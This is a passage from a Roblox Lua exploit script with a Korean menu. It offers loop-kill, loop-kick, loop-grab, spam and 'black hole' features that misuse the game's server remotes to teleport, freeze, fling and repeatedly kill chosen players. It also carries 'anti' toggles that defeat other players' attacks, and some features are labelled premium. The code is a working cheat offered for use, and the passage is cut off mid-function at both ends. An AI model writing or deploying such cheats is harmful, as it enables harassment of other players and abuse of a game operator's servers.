                    if blobKickT3 and player.Parent and char.Parent and hum.Health > 0 then
                        if myHrp and hrp and originCF then
                            hrp.CFrame = CFrame.new(originCF.X, originCF.Y + 50, originCF.Z)
                            myHrp.CFrame = hrp.CFrame
                            
                            if currentBlobS and hrp.Parent.Name == name then
                                BlobMassless(currentBlobS, hrp, "Right")
                            end
                            -- 기존 0.03초에서 판정이 완전히 서버에 각인되도록 안정적인 0.08초로 딜레이 조정
                            task.wait(0.08)
                        end
                    end

                    -- 공중 락 각인 완료 후 원래 위치 복귀
                    if originCF and myHrp then
                        BACK(originCF)
                    end

                    -- 타겟이 탈주하거나 리스폰하기 전까지 루프가 헛돌지 않게 완벽 격리 대기 (대기 시간 0.2초로 완화하여 렉 방지)
                    while blobKickT3 and player.Parent == game.Players and player.Character == char and hum.Health > 0 and hrp:IsDescendantOf(workspace) do
                        task.wait(0.2)
                    end

                    task.wait(0.1)
                    break
                end
                -- 포룹 내부 빈 주기 조절하여 비전투 상태 백그라운드 연산 최적화
                task.wait(0.05)
            end
        end)
    end
})

LoopTab:CreateSection("루프킥")
LoopTab:CreateButton({
    Name = "무질량 끄기",
    Callback = function()

        Players = game:GetService("Players")

        if playersInLoop1V == 0 then return end

        local Tchar = Tplr.Character
        local THRP = Tchar:FindFirstChild("HumanoidRootPart")
        if not THRP then return end

        if THRP.Massless then THRP.Massless = false end

    end
})

local blobLoopToggle = LoopTab:CreateToggle({
    Name = "루프킥  <font color='rgb(255,154,123)'>[블롭맨]</font>",
    CurrentValue = false,
    Flag = "21",
    Callback = function(Value)
        blobLoopT = Value
        if blobLoopT then
            table.clear(playersInLoop2V)
            for i, e in ipairs(playersInLoop1V) do
                local nameOnly = e:match("^(.-) %(") or e
                table.insert(playersInLoop2V, nameOnly)
            end
            loopPlayerBlobF()
        else
            blobLoopT = false
            table.clear(playersInLoop2V)

            for _, player in ipairs(game.Players:GetPlayers()) do
                if player.Character then
                    local head = player.Character:FindFirstChild("Head")
                    if head then
                        local kick = head:FindFirstChild("Kick")
                        if kick and kick:IsA("BodyPosition") then
                            kick:Destroy()
                        end
                    end
                end
            end
        end
    end
})
LoopTab:CreateToggle({
    Name = "ㄴ 앉기",
    CurrentValue = false,
    Flag = "21",
    Callback = function(Value)
        LoopBringMODED = Value
    end
})

LoopTab:CreateToggle({
    Name = "ㄴ 안티 인플레이스 모드",
    CurrentValue = false,
    Flag = "21",
    Callback = function(Value)
        LoopReleaseMODED = Value
    end
})
LoopTab:CreateSection("루프킬 블롭맨")
local blobLoop3Toggle = LoopTab:CreateToggle({
    Name = "루프킬   <font color='rgb(0,0,255)'>[프라임 오너쉽]</font>   <font color='rgb(255,0,0)'>[프리미엄]</font>",
    CurrentValue = false,
    Flag = "21",
    Callback = function(Value)
        blobLoopT3 = Value
        if blobLoopT3 then
            table.clear(playersInLoop2V)
            for i, e in ipairs(playersInLoop1V) do
                local nameOnly = e:match("^(.-) %(") or e
                table.insert(playersInLoop2V, nameOnly)
            end
            loopPlayerBlobF3()
        else
            blobLoopT3 = false
            table.clear(playersInLoop2V)
        end
    end
})


LoopTab:CreateToggle({
    Name = "블롭 루프킬V2  <font color='rgb(255,154,123)'>[블롭맨]</font>",
    CurrentValue = false,
    Flag = "21",
    Callback = function(Value)
        blobLoopT3 = Value
        
        if not Value then
            table.clear(playersInLoop2V)
            return
        end

        table.clear(playersInLoop2V)
        for _, e in ipairs(playersInLoop1V) do
            table.insert(playersInLoop2V, e:match("^(.-) %(") or e)
        end

        task.spawn(function()
            while blobLoopT3 do
                UpdateCurrentBlobman()

                local myChar = plr.Character
                local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
                local seat = myHum and myHum.SeatPart

                if not (seat and seat.Parent and seat.Parent.Name == "CreatureBlobman") then
                    task.wait(0.5)
                    continue
                end

                for _, name in ipairs(playersInLoop2V) do
                    if not blobLoopT3 then break end
                    if table.find(Whitelist, name) or PPs:FindFirstChild(name) then continue end

                    local player = game.Players:FindFirstChild(name)
                    if not player then continue end
                    
                    local char = player.Character
                    local hum = char and char:FindFirstChildOfClass("Humanoid")
                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
                    
                    if not char or not hum or not hrp or char.Parent == nil or not hrp:IsDescendantOf(workspace) then 
                        continue 
                    end

                    if hum.Health <= 0 then continue end

                    local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
                    if not myHrp then continue end

                    local beforeTP = myHrp.CFrame

                    local distance = (myHrp.Position - hrp.Position).Magnitude
                    if distance > 30 then
                        TP(player)
                        task.wait(0.03)
                        if myHrp then myHrp.CFrame = hrp.CFrame * CFrame.new(0, 0, 2) end
                    end

                    if hum and hum.Health > 0 then
                        hum.BreakJointsOnDeath = false
                        hum.WalkSpeed = 0
                        hum.JumpPower = 0

                        hum.RigType = Enum.HumanoidRigType.R15
                        hum.RigType = Enum.HumanoidRigType.R6
                        hum.RigType = Enum.HumanoidRigType.R15
                    end

                    while blobLoopT3 and hum and hum.Health > 0 and char.Parent ~= nil do
                        pcall(function()
                            rs.GrabEvents.SetNetworkOwner:FireServer(hrp, hrp.CFrame)
                            hrp.AssemblyLinearVelocity = Vector3.new(0, -999999, 0)
                        end)

                        if currentBlobS then
                            for i = 1, 3 do
                                if not blobLoopT3 or hum.Health <= 0 then break end
                                BlobGrab(currentBlobS, hrp, "Right")
                                BlobRelease(currentBlobS, hrp, "Right")
                                pcall(function()
                                    rs.GrabEvents.DestroyGrabLine:FireServer(hrp, CFrame.new(hrp.Position.X, -50000, hrp.Position.Z))
                                end)
                            end
                        end
                        task.wait()
                    end

                    if beforeTP and myHrp then
                        BACK(beforeTP)
                    end
                end
                task.wait(0.05)
            end
        end)
    end
})



local blobLoop2Toggle = LoopTab:CreateToggle({
    Name = "루프 그랩   <font color='rgb(255,154,123)'>[블롭맨]</font>",
    CurrentValue = false,
    Flag = "21",
    Callback = function(Value)
        blobLoopT2 = Value
        if blobLoopT2 then
            table.clear(playersInLoop2V)
            for i, e in ipairs(playersInLoop1V) do
                local nameOnly = e:match("^(.-) %(") or e
                table.insert(playersInLoop2V, nameOnly)
            end
            loopPlayerBlobF2()
        else
            blobLoopT2 = false
            table.clear(playersInLoop2V)
        end
    end
})

LoopTab:CreateSection("블롭없음")
local Loop1 = LoopTab:CreateToggle({
    Name = "루프킬   <font color='rgb(0,255,0)'>[그랩]</font>",
    CurrentValue = false,
    Flag = "21",
    Callback = function(Value)
        loopPlayerT = Value
        if loopPlayerT then
            table.clear(playersInLoop2V)
            for i, e in ipairs(playersInLoop1V) do
                local nameOnly = e:match("^(.-) %(") or e
                table.insert(playersInLoop2V, nameOnly)
            end
            loopPlayerF()
        else
            loopPlayerT = false
            table.clear(playersInLoop2V)
        end
    end
})



local Loop2 = LoopTab:CreateToggle({
    Name = "루프킥   <font color='rgb(0,255,0)'>[그랩]</font>",
    CurrentValue = false,
    Flag = "21",
    Callback = function(Value)
        loopPlayerT2 = Value
        if loopPlayerT2 then
            table.clear(playersInLoop2V)
            for i, e in ipairs(playersInLoop1V) do
                local nameOnly = e:match("^(.-) %(") or e
                table.insert(playersInLoop2V, nameOnly)
            end
            loopPlayerF2()
        else
            loopPlayerT2 = false
            table.clear(playersInLoop2V)
        end
    end
})

LoopTab:CreateSection("스팸")
LoopTab:CreateToggle({
    Name = "스팸  <font color='rgb(0,0,255)'>[프리미엄]</font>",
    CurrentValue = false,
    Flag = "27",
    Callback = function(Value)
        LoopSnowBallT = Value
        LoopSnowBallF()
    end
})

LoopTab:CreateButton({
    Name = "블랙홀  <font color='rgb(0,0,0)'>[닌자 쿠나이]</font>",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local Players = game:GetService("Players")
        local plr = Players.LocalPlayer

        if #playersInLoop1V == 0 then
            return
        end

        local targetPlayerName = playersInLoop1V[1]
        local targetPlayer = Players:FindFirstChild(targetPlayerName)

        if not targetPlayer or not targetPlayer.Character then
            return
        end

        local targetCharacter = targetPlayer.Character
        local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")

        if not targetHRP then
            return
        end

        local ragdollHitbox = targetHRP:FindFirstChild("RagdollTouchedHitbox")
        if not ragdollHitbox then
            ragdollHitbox = targetHRP
            for _, child in ipairs(targetHRP:GetChildren()) do
                if child.Name:find("Hitbox") or child.Name:find("Attachment") or child:IsA("Attachment") then
                    ragdollHitbox = child
                    break
                end
            end
        end

        local character = plr.Character or plr.CharacterAdded:Wait()
        local hrp = character:WaitForChild("HumanoidRootPart")
        local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")

        if not torso then
            return
        end

        local StickyPartEvent = ReplicatedStorage:WaitForChild("PlayerEvents"):WaitForChild("StickyPartEvent")
        local SpawnToy = ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")

        function GetPlotNumber()
            local char = plr.Character
            if not char then return nil end

            if char.Parent == workspace then 
                return nil
            elseif char.Parent.Name == "PlayersInPlots" then
                for _, plot in workspace.Plots:GetChildren() do
                    local plotSign = plot:FindFirstChild("PlotSign")
                    if plotSign and plotSign:FindFirstChild("ThisPlotsOwners") then
                        for _, owner in plotSign.ThisPlotsOwners:GetChildren() do
                            if owner.Value == plr.Name then
                                if plot.Name == "Plot1" then
                                    return 1
                                elseif plot.Name == "Plot2" then
                                    return 2
                                elseif plot.Name == "Plot3" then
                                    return 3
                                elseif plot.Name == "Plot4" then
                                    return 4
                                elseif plot.Name == "Plot5" then
                                    return 5
                                end
                            end
                        end
                    end
                end
            end
            return nil
        end

        function GetInventory()
            local plotNumber = GetPlotNumber()

            if plotNumber then
                local plotItems = workspace:FindFirstChild("PlotItems")
                if plotItems then
                    local plotFolder = plotItems:FindFirstChild("Plot" .. plotNumber)
                    if plotFolder then
                        return plotFolder
                    end
                end
            end
            
            local defaultInv = workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
            if defaultInv then
                return defaultInv
            end
            
            return nil
        end

        function createAndAttachKunai()
            while not plr.CanSpawnToy.Value do 
                task.wait(0.1) 
            end

            local position = hrp.CFrame

            local success, result = pcall(function()
                return task.spawn(function()
                    return SpawnToy:InvokeServer("NinjaKunai", hrp.CFrame * CFrame.new(0, 5, 15), Vector3.new(0, 0, 0))
                end)
            end)
            
            if not success then
                return nil
            end

            task.wait(0.2)

            local inv = GetInventory()
            if not inv then
                return nil
            end

            local kunai
            local children = inv:GetChildren()
            for i = #children, 1, -1 do
                if children[i].Name == "NinjaKunai" then
                    kunai = children[i]
                    break
                end
            end

            if not kunai then 
                return nil 
            end

            local stickyPart = kunai:WaitForChild("StickyPart")
            local SoundPart = kunai:WaitForChild("SoundPart")

            if stickyPart and SoundPart then
                pcall(function()
                    ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(SoundPart, SoundPart.CFrame)
                    ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(SoundPart, torso.CFrame)
                end)
            end

            if stickyPart then
                local attachPosition = ragdollHitbox.CFrame
                local relativeCF = ragdollHitbox.CFrame:ToObjectSpace(attachPosition)

                pcall(function()
                    StickyPartEvent:FireServer(stickyPart, ragdollHitbox, CFrame.new(0,50,0)* CFrame.Angles(190, 0, 0))
                end)
            end

            task.wait(0.1)
            return kunai
        end

        for i = 1, 12 do
            createAndAttachKunai()
            task.wait(0.15)
        end
    end
})


antiTab:CreateSection("Teleport | Toggle")
local AntiGrabV1 = antiTab:CreateToggle({
    Name = "무질량 이동 | TP",
    CurrentValue = false,
    Flag = "FakeTP",
    Callback = function(Value)
        AntiGrabTP_Active = Value

        if AntiGrabTP_Active then
            local char = plr.Character
            local cm = workspace.CurrentCamera
            
            if char then
                originalCharacter = char

                char.Archivable = true
                cloneCharacter = char:Clone()
                cloneCharacter.Parent = Workspace
                cloneCharacter.Name = "(Clone)"
                if cloneCharacter:FindFirstChild("Humanoid") then
                    cloneCharacter.Humanoid.BreakJointsOnDeath = false
                end
                char.Archivable = false

                if cm then
                    cm.CameraSubject = cloneCharacter:FindFirstChild("Humanoid")
                end
                plr.Character = cloneCharacter

                task.spawn(function()
                    while AntiGrabTP_Active and originalCharacter and originalCharacter.Parent do
                        local hrp = originalCharacter:FindFirstChild("HumanoidRootPart")
                        if hrp then
                            local randomX = math.random(-999999, 999999)
                            local randomZ = math.random(-999999, 999999)

                            hrp.CFrame = CFrame.new(randomX, 999999, randomZ)
                            task.wait()
                        else
                            task.wait(0.1)
                        end
                    end
                end)
            end
        else
            local cm = workspace.CurrentCamera

            if cloneCharacter then
                local cloneHRP = cloneCharacter:FindFirstChild("HumanoidRootPart")
                if cloneHRP then clonePosition = cloneHRP.CFrame end

                cloneCharacter:Destroy()
                cloneCharacter = nil
            end

            if originalCharacter and originalCharacter.Parent and cm then
                plr.Character = originalCharacter
                cm.CameraSubject = originalCharacter:FindFirstChild("Humanoid")

                if clonePosition then
                    local hrp = originalCharacter:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        hrp.CFrame = clonePosition
                    end
                end
            end

            originalCharacter = nil
        end
    end
})

local AntiGrabV1 = antiTab:CreateToggle({
    Name = "루프 TP | 랜덤",
    CurrentValue = false,
    Flag = "5",
    Callback = function(Value)
        AntiGrabTP_ActiveV2 = Value

        local originalPosition = nil

        if Value then
            local char = plr.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                originalPosition = char.HumanoidRootPart.Position
            end
        end

        task.spawn(function()
            while AntiGrabTP_ActiveV2 and task.wait() do
                local char = plr.Character
                if not char then continue end
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if not hrp then continue end

                local randomX = math.random(-500, 500)
                local randomY = math.random(0, 500)
                local randomZ = math.random(-500, 500)

                hrp.CFrame = CFrame.new(randomX, randomY, randomZ)
            end

            if not AntiGrabTP_ActiveV2 and originalPosition then

                local char = plr.Character
                if char and char:FindFirstChild("HumanoidRootPart") then
                    char.HumanoidRootPart.CFrame = CFrame.new(originalPosition)
                end
            end
        end)
    end
})

antiTab:CreateLabel("루프 TP같은경우 루프킬,킥을 우회할때 유용합니다.")


antiTab:CreateSection("오너쉽")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local characterConnections = {}
local activeCharacters = setmetatable({}, { __mode = "k" })

local MAX_VELOCITY_THRESHOLD = 150
local MAX_ROT_VELOCITY_THRESHOLD = 150
_G.AntiFlingEnabled = false

local function cleanupCharacterConnections(userId)
    if characterConnections[userId] then
        for connection in pairs(characterConnections[userId]) do
            if connection then connection:Disconnect() end
        end
        characterConnections[userId] = nil
    end
    activeCharacters[userId] = nil
end

local function monitorCharacter(character)
    if not _G.AntiFlingEnabled then return end
    
    local userId = LocalPlayer.UserId
    cleanupCharacterConnections(userId)
    
    local rootPart = character:WaitForChild("HumanoidRootPart", 5)
    local humanoid = character:WaitForChild("Humanoid", 5)
    if not rootPart or not humanoid then return end

    characterConnections[userId] = {}
    local registry = characterConnections[userId]

    local charData = {
        RootPart = rootPart,
        Humanoid = humanoid,
        LastSafeCFrame = rootPart.CFrame,
        Parts = {}
    }
    activeCharacters[userId] = charData

    local function refreshParts()
        table.clear(charData.Parts)
        for _, descendant in ipairs(character:GetDescendants()) do
            if descendant:IsA("BasePart") and not descendant.Anchored then
                table.insert(charData.Parts, descendant)
            end
        end
    end

    local addedConnection = character.DescendantAdded:Connect(function(descendant)
        if descendant:IsA("BasePart") then
            refreshParts()
        end
    end)
    registry[addedConnection] = true

    refreshParts()

    local mainPhysicsConnection
    mainPhysicsConnection = RunService.Heartbeat:Connect(function()
        if not _G.AntiFlingEnabled then
            cleanupCharacterConnections(userId)
            return
        end

        if not character or not character.Parent or humanoid.Health <= 0 then
            cleanupCharacterConnections(userId)
            return
        end

        local anomalyDetected = false

        for _, part in ipairs(charData.Parts) do
            if part and part.Parent then
                local velocity = part.AssemblyLinearVelocity.Magnitude
                local rotVelocity = part.AssemblyAngularVelocity.Magnitude

                if velocity > MAX_VELOCITY_THRESHOLD or rotVelocity > MAX_ROT_VELOCITY_THRESHOLD then
                    anomalyDetected = true
                    part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                end
            end
        end

        if anomalyDetected then
            if charData.LastSafeCFrame then
                rootPart.CFrame = charData.LastSafeCFrame
            end
        else
            charData.LastSafeCFrame = rootPart.CFrame
        end
    end)
    registry[mainPhysicsConnection] = true

    local removingConnection
    removingConnection = character.AncestryChanged:Connect(function(_, parent)
        if not parent then cleanupCharacterConnections(userId) end
    end)
    registry[removingConnection] = true
end

LocalPlayer.CharacterAdded:Connect(monitorCharacter)



antiTab:CreateToggle({
    Name = "안티 오너쉽 스팸   <font color='rgb(0,0,255)'>[프리미엄]</font>",
    CurrentValue = false,
    Flag = "AntiFlingToggle",
    Callback = function(Value)
        _G.AntiFlingEnabled = Value
        if Value then
            if LocalPlayer.Character then
                monitorCharacter(LocalPlayer.Character)
            end
        else
            cleanupCharacterConnections(LocalPlayer.UserId)
        end
    end,
})

antiTab:CreateSection("그랩 | 토클")
local AntiGrab = antiTab:CreateToggle({
    Name = "안티 그랩   <font color='rgb(0,255,0)'>[오너쉽]</font>   <font color='rgb(0,0,255)'>[프리미엄]</font>",
    CurrentValue = false,
    Flag = "5",
    Callback = function(Value)
        AntiGrabF(Value)
    end
})
AntiGrab:Set(true)
antiTab:CreateToggle({
    Name = "안티그랩V2   <font color='rgb(255,0,0)'>[프라임오너쉽]</font>",
    Default = false,
    Save = false,
    Flag = "antiGrab",
    Callback = function(enabled)
        if enabled then
            autoStruggleCoroutine = RunService.Heartbeat:Connect(function()
                local character = localPlayer.Character
                if character and character:FindFirstChild("Head") then
                    local head = character.Head
                    local partOwner = head:FindFirstChild("PartOwner")
                    if partOwner then
                        Struggle:FireServer()
                        if game:GetService("ReplicatedStorage"):FindFirstChild("GameCorrectionEvents") and game:GetService("ReplicatedStorage").GameCorrectionEvents:FindFirstChild("StopAllVelocity") then
                            game:GetService("ReplicatedStorage").GameCorrectionEvents.StopAllVelocity:FireServer()
                        end
                        for _, part in pairs(character:GetChildren()) do
                            if part:IsA("BasePart") then
                                part.Anchored = true
                            end
                        end
                        if localPlayer:FindFirstChild("IsHeld") and localPlayer.IsHeld:IsA("ValueObject") then
                            while localPlayer.IsHeld.Value do
                                task.wait()
                            end
                        end
                        for _, part in pairs(character:GetChildren()) do
                            if part:IsA("BasePart") then
                                part.Anchored = false
                            end
                        end
                    end
                end
            end)
        else
            if autoStruggleCoroutine then
                autoStruggleCoroutine:Disconnect()
                autoStruggleCoroutine = nil
            end
        end
    end
})

blobmanInstanceS = nil
task.spawn(function()
    task.wait(0.5)
    if AntiGrabToggle and AntiGrabToggle.Set then
        AntiGrabToggle:Set(true)
    end
end)


antiTab:CreateToggle({
    Name = "안티그랩V3   <font color='rgb(0,0,255)'>[프리미엄]</font>",
    CurrentValue = false,
    Flag = "AutoStruggle", 
    Callback = function(enabled)
        if enabled then
            autoStruggleCoroutine = RunService.Heartbeat:Connect(function()
                local character = localPlayer.Character
                if character and character:FindFirstChild("Head") then
                    local head = character.Head
                    local partOwner = head:FindFirstChild("PartOwner")
                    if partOwner then
                        Struggle:FireServer()
                        ReplicatedStorage.GameCorrectionEvents.StopAllVelocity:FireServer()
                        for _, part in pairs(character:GetChildren()) do
                            if part:IsA("BasePart") then
                                part.Anchored = true
                            end
                        end
                        while localPlayer.IsHeld.Value do
                            wait()
                        end
                        for _, part in pairs(character:GetChildren()) do
                            if part:IsA("BasePart") then
                                part.Anchored = false
                            end
                        end
                    end
                end
            end)
        else
            if autoStruggleCoroutine then
                autoStruggleCoroutine:Disconnect()
                autoStruggleCoroutine = nil
            end
        end
    end
})


local AntiGrabSticky = antiTab:CreateToggle({
    Name = "안티그랩 |  StickyPart",
    CurrentValue = false,
    Callback = function(Value)
        AntiGrabStickyT = Value
        if Value then
            AntiGrabStickyF()
        end
    end
})



local itemTranslation = {
    ["바나나"] = "FoodBanana",
    ["빵"] = "FoodBread",
    ["브로콜리"] = "FoodBroccoli",
    ["케이크"] = "FoodCakePink",
    ["코코넛"] = "FoodCoconut",
    ["계란 후라이"] = "FoodDippyEgg",
    ["도넛"] = "FoodDonut",
    ["감자튀김"] = "FoodFrenchFries",
    ["햄버거"] = "FoodHamburger",
    ["핫도그"] = "FoodHotdog",
    ["마요네즈"] = "FoodMayonnaise",
    ["고기꼬치"] = "FoodMeatStick",
    ["독버섯"] = "FoodMushroomPoison",
    ["치즈 피자"] = "FoodPizzaCheese",
    ["페페로니 피자"] = "FoodPizzaPepperoni",
    ["음료수 캔"] = "FoodSodaCan",
    ["나팔"] = "InstrumentBrassBugle",
    ["트럼펫"] = "InstrumentBrassTrumpet",
    ["봉고 드럼"] = "InstrumentDrumBongos",
    ["스네어 드럼"] = "InstrumentDrumSnare",
    ["어쿠스틱 기타"] = "InstrumentGuitarAcoustic",
    ["벤조"] = "InstrumentGuitarBanjo",
    ["리라"] = "InstrumentGuitarLyre",
    ["우쿨렐레"] = "InstrumentGuitarUkulele",
    ["바이올린"] = "InstrumentGuitarViolin",
    ["전자 피아노"] = "InstrumentPianoKeyboard",
    ["멜로디카"] = "InstrumentPianoMelodica",
    ["마이크"] = "InstrumentVoiceMicrophone",
    ["오카리나"] = "InstrumentWoodwindOcarina",
    ["색소폰"] = "InstrumentWoodwindSaxophone",
    ["부부젤라"] = "InstrumentBrassVuvuzela"
}

function AntiDeathF(itemName)
    if activeConnection then
        activeConnection:Disconnect()
        activeConnection = nil
    end

    activeConnection = rs2.Heartbeat:Connect(function()
        if not AntiDeathT then
            if activeConnection then
                activeConnection:Disconnect()
                activeConnection = nil
            end
            return
        end

        local Character = plr.Character
        if not Character then return end

        local donut = inv:FindFirstChild(itemName)

        if not donut then
            pcall(function()
                rs.MenuToys.SpawnToyRemoteFunction:InvokeServer(itemName, CFrame.new(0,0,0), Vector3.new(0,0,0))
            end)
            return
        end

        if not donut:FindFirstChild("HoldPart") then return end

        local HoldItemRemoteFunction = donut.HoldPart:FindFirstChild("HoldItemRemoteFunction")
        local DropItemRemoteFunction = donut.HoldPart:FindFirstChild("DropItemRemoteFunction")

        if HoldItemRemoteFunction and DropItemRemoteFunction then
            HoldItemRemoteFunction:InvokeServer(donut, Character)
            DropItemRemoteFunction:InvokeServer(donut, CFrame.new(99999, 99999, 99999), Vector3.new(99999, 99999, 99999))
        end
    end)
end

RunService = game:GetService("RunService")
Camera = workspace.CurrentCamera

local currentSelectedOption = "FoodMayonnaise"

antiTab:CreateToggle({
    Name = "안티 인풋   <font color='rgb(255,0,0)'>[NETWORK OWNER]</font>  <font color='rgb(0,0,255)'>[프리미엄]</font>",
    CurrentValue = false,
    Flag = "AntiDeathToggleFlag",
    Callback = function(Value)
        AntiDeathT = Value
        if AntiDeathT then
            task.spawn(function()
                AntiDeathF(currentSelectedOption)
            end)
        else
            if activeConnection then
                activeConnection:Disconnect()
                activeConnection = nil
            end
        end
    end,
})


antiTab:CreateDropdown({
    Name = "사용할 아이템 선택(누나 빵 추천)",
    Options = {
        "마요네즈", "바나나", "빵", "브로콜리", "핑크 케이크", "코코넛", "반숙란", "도넛", 
        "감자튀김", "햄버거", "핫도그", "우쿨렐레", "고기꼬치", "독버섯", "치즈 피자", 
        "페페로니 피자", "음료수 캔", "나팔", "트럼펫", "봉고 드럼", "스네어 드럼", 
        "어쿠스틱 기타", "벤조", "리라", "바이올린", "전자 피아노", "멜로디카", 
        "마이크", "오카리나", "색소폰", "부부젤라"
    },
    CurrentOption = "마요네즈", 
    Flag = "ItemDropdownFlag",
    Callback = function(Option)
        local rawSelection = type(Option) == "table" and Option[1] or Option
        if type(rawSelection) == "string" then
            local englishName = itemTranslation[rawSelection]
            if englishName then
                currentSelectedOption = englishName
                if AntiDeathT then
                    task.spawn(function()
                        AntiDeathF(englishName)
                    end)
                end
            end
        end
    end,
})
antiTab:CreateToggle({
    Name = "안티킥 <font color='rgb(0,255,0)'>[그랩]</font>",
    CurrentValue = false,
    Flag = "AntiKickGrab", 
    Callback = function(enabled)
        if enabled then
            local character = localPlayer.Character

            antiKickCoroutine = RunService.Heartbeat:Connect(function()
                local character = localPlayer.Character
                if character and character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("HumanoidRootPart"):FindFirstChild("FirePlayerPart") then
                    local partOwner = character:FindFirstChild("HumanoidRootPart"):FindFirstChild("FirePlayerPart"):FindFirstChild("PartOwner")
                    if partOwner and partOwner.Value ~= localPlayer.Name then
                        local args = {[1] = character:WaitForChild("HumanoidRootPart"), [2] = 0}
                        game:GetService("ReplicatedStorage"):WaitForChild("CharacterEvents"):WaitForChild("RagdollRemote"):FireServer(unpack(args))
                        print("grabbity shap!")
                        wait(0.1)
                        Struggle:FireServer()
                    end
                end
            end)
        else
            if antiKickCoroutine then
                antiKickCoroutine:Disconnect()
                antiKickCoroutine = nil
            end
        end
    end
})


local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local characterConnections = {}
local activeCharacters = setmetatable({}, { __mode = "k" })

local MAX_VELOCITY_THRESHOLD = 150
local MAX_ROT_VELOCITY_THRESHOLD = 150
_G.AntiFlingEnabled = false

local function cleanupCharacterConnections(userId)
    if characterConnections[userId] then
        for connection in pairs(characterConnections[userId]) do
            if connection then connection:Disconnect() end
        end
        characterConnections[userId] = nil
    end
    activeCharacters[userId] = nil
end

local function monitorCharacter(character)
    if not _G.AntiFlingEnabled then return end
    
    local userId = LocalPlayer.UserId
    cleanupCharacterConnections(userId)
    
    local rootPart = character:WaitForChild("HumanoidRootPart", 5)
    local humanoid = character:WaitForChild("Humanoid", 5)
    if not rootPart or not humanoid then return end

    characterConnections[userId] = {}
    local registry = characterConnections[userId]

    local charData = {
        RootPart = rootPart,
        Humanoid = humanoid,
        LastSafeCFrame = rootPart.CFrame,
        Parts = {}
    }
    activeCharacters[userId] = charData

    local function refreshParts()
        table.clear(charData.Parts)
        for _, descendant in ipairs(character:GetDescendants()) do
            if descendant:IsA("BasePart") and not descendant.Anchored then
                table.insert(charData.Parts, descendant)
            end
        end
    end

    local addedConnection = character.DescendantAdded:Connect(function(descendant)
        if descendant:IsA("BasePart") then
            refreshParts()
        end
    end)
    registry[addedConnection] = true

    refreshParts()

    local mainPhysicsConnection
    mainPhysicsConnection = RunService.Heartbeat:Connect(function()
        if not _G.AntiFlingEnabled then
            cleanupCharacterConnections(userId)
            return
        end

        if not character or not character.Parent or humanoid.Health <= 0 then
            cleanupCharacterConnections(userId)
            return
        end

        local anomalyDetected = false

        for _, part in ipairs(charData.Parts) do
            if part and part.Parent then
                local velocity = part.AssemblyLinearVelocity.Magnitude
                local rotVelocity = part.AssemblyAngularVelocity.Magnitude

                if velocity > MAX_VELOCITY_THRESHOLD or rotVelocity > MAX_ROT_VELOCITY_THRESHOLD then
                    anomalyDetected = true
                    part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                end
            end
        end

        if anomalyDetected then
            if charData.LastSafeCFrame then
                rootPart.CFrame = charData.LastSafeCFrame
            end
        else
            charData.LastSafeCFrame = rootPart.CFrame
        end
    end)
    registry[mainPhysicsConnection] = true

    local removingConnection
    removingConnection = character.AncestryChanged:Connect(function(_, parent)
        if not parent then cleanupCharacterConnections(userId) end
    end)
    registry[removingConnection] = true
end

LocalPlayer.CharacterAdded:Connect(monitorCharacter)






antiTab:CreateSection("블롭")
local AntiBlob = antiTab:CreateToggle({
	Name = "안티 블롭맨",
	CurrentValue = false,
	Flag = "16",
	Callback = function(Value)
		AntiBlobT = Value
		if Value then
			AntiBlobF()
		end
	end
})
AntiBlob:Set(true)
if not AntiCheatStates then
    _G.AntiCheatStates = { blobConn = nil }
end

function SetAntiBlobman(enabled)
    local localPlayer = game.Players.LocalPlayer
    if not localPlayer then return end
    
    local function processPart(part)
        local invalid = part.Name == "LeftWeld" or part.Name == "RightWeld" or part.Name == "LeftAlignOrientation" or
                            part.Name == "RightAlignOrientation"

        if invalid and part.Parent and part.Parent.Parent and part.Parent.Parent.Parent ~=
            workspace:FindFirstChild(localPlayer.Name) then
            part.Enabled = not enabled
        end
    end
    for _, part in pairs(workspace:GetDescendants()) do
        processPart(part)
    end
    if enabled then
        if _G.AntiCheatStates.blobConn then
            _G.AntiCheatStates.blobConn:Disconnect()
        end
        _G.AntiCheatStates.blobConn = workspace.DescendantAdded:Connect(function(part)
            processPart(part)
        end)
    elseif _G.AntiCheatStates.blobConn then
        _G.AntiCheatStates.blobConn:Disconnect()
        _G.AntiCheatStates.blobConn = nil
    end
end

antiTab:CreateToggle({
    Name = "안티 블롭맨V2<font color='rgb(0,255,0)'>[오너쉽]</font>",
    Default = false,
    Callback = function(Value)
        SetAntiBlobman(Value)
    end
})
task.spawn(function()
    task.wait(0.5)
    if AntiBlobmanToggle and AntiBlobmanToggle.Set then
        AntiBlobmanToggle:Set(true)
    end
end)



local AntiMassless = antiTab:CreateToggle({
    Name = "안티 메슬리즈  <font color='rgb(0,0,255)'>[프리미엄]</font>",
    CurrentValue = false,
    Flag = "17",
    Callback = function(Value)
    masslessT = Value
        masslessF()
    end
})
AntiMassless:Set(true)
antiTab:CreateSection("안티 에어 서스펜션")
antiTab:CreateToggle({
    Name = "디펜스 / 에어 서브펜션",
    CurrentValue = false,
    Flag = "SelfDefenseAirSuspend", 
    Callback = function(enabled)
        if enabled then
            autoDefendCoroutine = coroutine.create(function()
                while wait(0.02) do
                    local character = localPlayer.Character
                    if character and character:FindFirstChild("Head") then
                        local head = character.Head
                        local partOwner = head:FindFirstChild("PartOwner")
                        if partOwner then
                            local attacker = Players:FindFirstChild(partOwner.Value)
